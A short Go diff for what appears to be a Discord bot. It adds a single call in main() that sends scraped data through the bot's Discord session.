@@ -28,6 +28,8 @@ func init() {
 
 func main() {
 	defer discordSession.Close()
+
+	utility.SendScrappedData(discordSession, envData)
 	
 	sc := make(chan os.Signal, 1)
 	signal.Notify(sc, os.Interrupt)
